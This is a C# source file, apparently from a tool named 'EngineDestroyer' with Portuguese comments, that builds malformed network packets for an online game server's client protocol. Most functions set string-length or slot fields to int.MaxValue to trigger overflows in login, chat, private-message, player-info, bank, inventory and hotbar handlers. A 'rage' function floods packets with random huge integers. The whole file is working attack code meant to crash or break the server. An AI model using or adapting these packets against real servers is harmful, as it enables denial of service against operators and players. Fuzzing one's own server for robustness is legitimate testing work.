using System;
using System.Text;

namespace EngineDestroyer {
    public class Packet {
        /// <summary>
        /// Cria o pacote para criação de usuário.
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public static byte[] CreateAccount(string account, string password = "") {
            var user = Encoding.ASCII.GetBytes(account);
            //indice do packet
            var head = 0;

            //calculando o tamanho total do pacote
            //size packet = header + user length + user(bytes) + pass length + pass(bytes)
            //cada letra equivale a 1 byte,
            //4 bytes tamanho do pacote, 4 bytes do header, os dados em bytes, 8 bytes do user + pass  (4 de cada um)     
            var totalSize = 0;
            if (password.Length > 0) {
                totalSize = 4 + 4 + (account.Length + password.Length) + 8;
            }
            else {
                totalSize = 4 + 4 + (account.Length * 2) + 8;
            }

            var packet = new byte[totalSize];

            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte)ClientPacket.CNewAccount;

            //8, 9, 10, 11 = tamanho do nome de usuário
            packet[8] = (byte)account.Length;

            //12 em diante = nome do usuário convertido pra bytes
            Array.Copy(user, 0, packet, 12, user.Length);

            //os nomes nesse programa tem tamanho fixo, 10 letras, logo 10 bytes
            //começa no 12 e termina no 21

            //muda pro proximo slot
            head = 12 + user.Length;   //12 + 10 = head = 22

            //tamanho da senha do usuário
            if (password.Length > 0) {
                packet[head] = (byte)password.Length;
            } else {
                packet[head] = (byte)account.Length;
            }

            head += 4; //aumenta mais 4 para ir para o próximo slot

            //escreve a senha
            if (password.Length > 0) {          
                user = Encoding.ASCII.GetBytes(password);
                Array.Copy(user, 0, packet, head, user.Length);
            }
            else {
                Array.Copy(user, 0, packet, head, user.Length);
            }

            //define o tamanho do pacote 
            var buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);
 
            // extra:
            //quando o pacote chega no servidor, ele é analisado e então, antes de ser chamado no handledata
            //é removido os 4 primeiros bytes que é o tamanho total do pacote
          
            return packet;
        }

        /// <summary>
        /// Gera um estouro quando tenta ler uma string.
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public static byte[] LoginOverflow(string account, bool version = false) {
            var user = Encoding.ASCII.GetBytes(account);
            //indice do packet
            var head = 0;            
            var totalSize = 4 + 4 + (account.Length * 3) + 8;
            var packet = new byte[totalSize];

            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte)ClientPacket.CLogin;

            //8, 9, 10, 11 = tamanho do nome de usuário
            //escreve um valor muito alto no tamanho da senha para dar erro no servidor
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);
            //packet[8] = (byte)account.Length;

            //12 em diante = nome do usuário convertido pra bytes
            Array.Copy(user, 0, packet, 12, user.Length);

            //muda pro proximo slot
            head = 12 + user.Length;   //12 + 10 = head = 22

            //tamanho da senha de usuário
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            packet[head] = (byte)account.Length;

            head += 4; //aumenta mais 4 para ir para o próximo slot
       
            //escreve a senha
            Array.Copy(user, 0, packet, head, user.Length);

            //define o tamanho do pacote 
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Envia uma mensagem de texto para o servidor.
        /// </summary>
        /// <param name="text"></param>
        /// <returns></returns>
        public static byte[] Message(ClientPacket cPacket, string text, bool overflow = false) {
            var packet = new byte[text.Length + 12];
            var msg = Encoding.ASCII.GetBytes(text);
            var head = 0;
            var buffer = new byte[4];

            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            head = 4;
            packet[head] = (byte)cPacket;

            head = 8;

            if (overflow) {
                //cria um estouro
                buffer = BitConverter.GetBytes(int.MaxValue);
                Array.Copy(buffer, 0, packet, head, buffer.Length);
            }
            else {
                //escreve a quantidade de caracteres
                buffer = BitConverter.GetBytes(text.Length);
                Array.Copy(buffer, 0, packet, head, buffer.Length);
            }

            head += 4;

            //escreve a mensagem
            Array.Copy(msg, 0, packet, head, msg.Length);

            head += msg.Length;

            //escreve o tamanho do pacote
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }
   
        /// <summary>
        /// Envia uma mensagem privada para o alvo.
        /// </summary>
        /// <param name="text"></param>
        /// <param name="target"></param>
        /// <param name="overflow"></param>
        /// <returns></returns>
        public static byte[] PlayerMessage(string text, string target, bool overflow = false) {
            var packet = new byte[text.Length + target.Length + 16];
            var msg = Encoding.ASCII.GetBytes(text);
            var player = Encoding.ASCII.GetBytes(target);
            var head = 0;
            var buffer = new byte[4];

            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            head = 4;
            packet[head] = (byte)ClientPacket.CPlayerMsg;

            head = 8;

            //escreve o tamanho do nome do alvo
            buffer = BitConverter.GetBytes(target.Length);
            Array.Copy(buffer, 0, packet, head, buffer.Length);

            head += 4;

            //escreve o nome do alvo
            Array.Copy(player, 0, packet, head, player.Length);

            head += player.Length;

            if (overflow) {
                //cria um estouro
                buffer = BitConverter.GetBytes(int.MaxValue);
                Array.Copy(buffer, 0, packet, head, buffer.Length);
            }
            else {
                //escreve a quantidade de caracteres da mensagem
                buffer = BitConverter.GetBytes(text.Length);
                Array.Copy(buffer, 0, packet, head, buffer.Length);
            }

            head += 4;

            //escreve a mensagem
            Array.Copy(msg, 0, packet, head, msg.Length);

            head += msg.Length;

            //escreve o tamanho do pacote
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Envia um número maior do que o permitido.
        /// </summary>
        /// <returns></returns>
        public static byte[] ChangeBankSlots() {
            const int packetSize = 4;
            const int header = 4;
            const int firstValue = 4;
            const int secondValue = 4;

            var packet = new byte[packetSize + header + firstValue + secondValue];
            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte)ClientPacket.CChangeBankSlots;

            //primeiro número
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            //segundo número
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 12, buffer.Length);

            //escreve o tamanho do pacote
            packet[0] = header + firstValue + secondValue;

            return packet;
        }

        /// <summary>
        /// Envia um número maior do que o permitido.
        /// </summary>
        /// <returns></returns>
        public static byte[] SwapInvSlots() {
            const int packetSize = 4;
            const int header = 4;
            const int firstValue = 4;
            const int secondValue = 4;

            var packet = new byte[packetSize + header + firstValue + secondValue];
            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte)ClientPacket.CSwapInvSlots;

            //primeiro número
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            //segundo número
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 12, buffer.Length);

            //escreve o tamanho do pacote
            packet[0] = header + firstValue + secondValue;

            return packet;
        }

        /// <summary>
        /// Envia um número maior do que o permitido.
        /// </summary>
        /// <returns></returns>
        public static byte[] HotbarUse() {
            var packet = new byte[4 + 4 + 4];
            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte)ClientPacket.CHotbarUse;

            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 8, buffer.Length);

            packet[0] = (byte)(packet.Length - 4);

            return packet;
        }

        /// <summary>
        /// Envia um número maior do que o permitido.
        /// </summary>
        /// <returns></returns>
        public static byte[] HotbarChange() {
            var packet = new byte[5 * 4];
            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[4] = (byte) ClientPacket.CHotbarChange;

            //type = 0, não precisa escrever 
            //posição 8
           
            //valor do slot
            //posição 12
            var buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 12, buffer.Length);

            //hotbar
            //posição 16
            buffer = BitConverter.GetBytes(int.MaxValue);
            Array.Copy(buffer, 0, packet, 16, buffer.Length);

            packet[0] = (byte)(packet.Length - 4);

            return packet;
       }

        /// <summary>
        /// Requisita as informaçãoes do alvo (jogador).
        /// </summary>
        /// <param name="overflow"></param>
        /// <returns></returns>
        public static byte[] PlayerInfoRequest(bool overflow = false) {
            var text = "mensagem";
            var packet = new byte[text.Length + 12];
            var msg = Encoding.ASCII.GetBytes(text);
            var index = 4;
            var buffer = new byte[4];

            //0, 1, 2, 3 = tamanho do pacote (adicionado no final)

            //4, 5, 6, 7 = cabeçalho
            packet[index] = (byte)ClientPacket.CPlayerInfoRequest;

            index += 4;

            if (overflow) {
                //cria um estouro
                buffer = BitConverter.GetBytes(int.MaxValue);
                Array.Copy(buffer, 0, packet, index, buffer.Length);
            }
            else {
                //escreve a quantidade de caracteres
                buffer = BitConverter.GetBytes(text.Length);
                Array.Copy(buffer, 0, packet, index, buffer.Length);
            }

            index += 4;

            //escreve a mensagem
            Array.Copy(msg, 0, packet, index, msg.Length);

            index += msg.Length;

            //escreve o tamanho do pacote
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }

        /// <summary>
        /// Cria o pacote no modo fúria.
        /// </summary>
        /// <param name="header"></param>
        /// <param name="count"></param>
        /// <returns></returns>
        public static byte[] CreateRagePacket(int header, int count) {
            var packet = new byte[8 + (4 * count)];
            var index = 8;
            //escreve o header
            var buffer = BitConverter.GetBytes(header);
            Array.Copy(buffer, 0, packet, 4, buffer.Length);

            for(int n = 0; n < count; n++) {
                buffer = BitConverter.GetBytes(new Random().Next(50000, int.MaxValue));
                Array.Copy(buffer, 0, packet, index, buffer.Length);
                index += 4;
            }

            //escreve o valor do pacote
            buffer = BitConverter.GetBytes(packet.Length - 4);
            Array.Copy(buffer, 0, packet, 0, buffer.Length);

            return packet;
        }
    }
}